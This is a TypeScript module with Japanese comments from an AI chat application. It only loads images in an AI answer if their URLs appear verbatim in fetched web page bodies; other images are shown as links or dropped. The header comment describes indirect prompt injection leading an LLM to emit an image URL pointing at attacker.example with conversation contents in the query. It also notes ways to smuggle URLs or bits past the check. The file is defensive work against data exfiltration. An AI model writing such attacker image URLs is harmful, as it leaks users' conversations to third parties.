/// AI の回答に描く画像の出所チェック（#1005・PIT-77）。
///
/// 回答の `![](url)` をそのまま `<img>` にすると、閲覧者のブラウザがクリック無しでその URL を読みに行く。
/// 検索に混ざった文書の指示（間接プロンプトインジェクション）で LLM が
/// `![](https://attacker.example/?q=<会話の中身>)` を書くと、会話や検索結果が外へ送られてしまう。
/// サニタイザ（XSS 対策）ではこれを防げない。
///
/// そこで**取得した Web ページの本文（第三者が会話を見る前に書いたもの）に、画像として字句どおり現れた URL**
/// だけを画像として読み込む。出所に数えるのは web_fetch の封筒（`<web_page>`〜`</web_page>`）の内側と、
/// Web の引用の抜粋だけ。ツール結果全般を数えると、モデルが自分で書いた文字列（検索語を繰り返す
/// 「〜に一致するものはありません」、シェルやコード実行の出力、サブエージェントの報告）を経由して、
/// 組み立てた URL を出所に紛れ込ませられる。
/// それ以外の画像は読み込まず、行き先のホストを添えたリンクとして見せる（押したときだけ開く）。

import type { ToolName } from "@/generated/gui-spec";

/// ページの本文を返すツール（封筒の内側がページ由来）。語彙は codegen の `ToolName` で縛る。
const WEB_PAGE_TOOL: ToolName = "web_fetch";
/// web_fetch の封筒（`crates/agent-core/src/tools/web_fetch/envelope.rs` の OPEN / CLOSE）。
/// ページ由来のヘッダと本文の `<web_page` / `</web_page` はサーバが実体参照に潰すので、**最初の**閉じタグが
/// 本物。封筒の後ろの案内にはモデルの入力（`query`）がそのまま入るので、最後の閉じタグを探してはいけない。
const PAGE_OPEN = "<web_page>";
const PAGE_CLOSE = "</web_page>";

/// 出典の本文から画像の URL を拾う。web_fetch は HTML を Markdown へ変換して返すので Markdown の画像記法を
/// 主に見る（htmd は URL の括弧を `\(` とエスケープする）。生 HTML が残った場合に備え `<img src>` も見る。
/// 敵対的な本文（`![` や `<img` の大量の繰り返し）で二次時間にならないよう、各部分の長さに上限を置く。
const MD_IMAGE = /!\[(?:[^\]\\\n]|\\.){0,300}\]\(\s*<?((?:[^\s<>()\\]|\\.){1,2048})>?/g;
const HTML_IMAGE = /<img\b[^>]{0,500}?\bsrc\s*=\s*["']([^"'<>]{1,2048})["']/gi;

/// 比較用に URL を正規化する。http(s) 以外・資格情報付きは null。
///
/// react-markdown は画像の URL を独自にパーセントエンコードしてから `src` に渡し（`|` `{` `}` `^` なども
/// エンコードする）、WHATWG URL はそれらを生のまま残す。どちらの書き方でも同じ値になるよう、
/// URL として解釈したあと、区切りの意味を持たない文字のエンコードを戻して揃える。
/// 認証情報付き（`user:pass@`）は出典に現れても読まない（閲覧者のブラウザに資格情報を送らせない）。
export function canonicalImageUrl(raw: string): string | null {
  let u: URL;
  try {
    u = new URL(raw.trim());
  } catch {
    return null;
  }
  if (u.protocol !== "https:" && u.protocol !== "http:") return null;
  if (u.username || u.password) return null;
  u.hash = "";
  return u.href.replace(/%([0-9a-f]{2})/gi, (m, hex: string) => {
    const c = String.fromCharCode(parseInt(hex, 16));
    return /[A-Za-z0-9\-._~|{}^`]/.test(c) ? c : m.toUpperCase();
  });
}

/// ツール結果の本文のうち、ページ由来の部分（web_fetch の封筒の内側）。
function webPageBody(result: string): string | null {
  const start = result.indexOf(PAGE_OPEN);
  if (start < 0) return null;
  const from = start + PAGE_OPEN.length;
  const end = result.indexOf(PAGE_CLOSE, from);
  return end >= 0 ? result.slice(from, end) : null;
}

/// 出典の画像。比較用の正規化した URL → **出典に書かれていた** URL（読み込むのはこちら）。
///
/// 比較は正規化した値で行うが、読み込みに回答側の字句を使うと、`a` と `%61` の書き分けや 16 進の大小で
/// 1 枚の画像に任意のビットを載せられる。読み込む URL を出典の字句に固定し、回答の書き方を通信に効かせない。
export type ImageSources = ReadonlyMap<string, string>;

/// 出典の URL を、読み込みに使う形（WHATWG URL の href・断片なし）にする。
function fetchableUrl(raw: string): string {
  const u = new URL(raw.trim());
  u.hash = "";
  return u.href;
}

/// 本文の並びから、画像として現れた URL を集める（呼び出し側が、ページ由来の本文だけを渡す）。
export function collectImageSources(texts: Iterable<string | null | undefined>): Map<string, string> {
  const out = new Map<string, string>();
  const add = (raw: string) => {
    const key = canonicalImageUrl(raw);
    // 同じ画像が複数の書き方で現れたら、最初のものを使う（どれも第三者が書いた字句）。
    if (key && !out.has(key)) out.set(key, fetchableUrl(raw));
  };
  for (const text of texts) {
    if (!text) continue;
    for (const m of text.matchAll(MD_IMAGE)) if (m[1]) add(m[1].replace(/\\(.)/g, "$1"));
    for (const m of text.matchAll(HTML_IMAGE)) if (m[1]) add(m[1].replace(/&amp;/g, "&"));
  }
  return out;
}

/// 回答の出典になる本文（ページ由来のものだけ）。`tools` はこの回答のツール呼び出し（サブエージェント分を含む）、
/// `webSnippets` は Web の引用の抜粋（取得したページの本文の先頭・検索結果の説明）。
export function pageSourcedTexts(
  tools: Iterable<{ name: string; result?: string }>,
  webSnippets: Iterable<string>,
): string[] {
  const out: string[] = [...webSnippets];
  for (const t of tools) {
    if (t.name !== WEB_PAGE_TOOL || !t.result) continue;
    const body = webPageBody(t.result);
    if (body) out.push(body);
  }
  return out;
}

/// 回答の画像の扱い。`load` は読み込む、`link` は読み込まずにリンクとして見せる（http(s) のみ）、
/// `drop` は画像としては何も出さない（相対 URL・`javascript:`・`data:` など。代わりに代替テキストを出す）。
export type AnswerImageDecision =
  | { kind: "load"; src: string }
  | { kind: "link"; href: string; host: string }
  | { kind: "drop" };

export function decideAnswerImage(src: string, sources: ImageSources): AnswerImageDecision {
  const key = canonicalImageUrl(src);
  if (!key) return { kind: "drop" };
  const source = sources.get(key);
  if (source) return { kind: "load", src: source };
  const href = fetchableUrl(src);
  return { kind: "link", href, host: new URL(href).host };
}
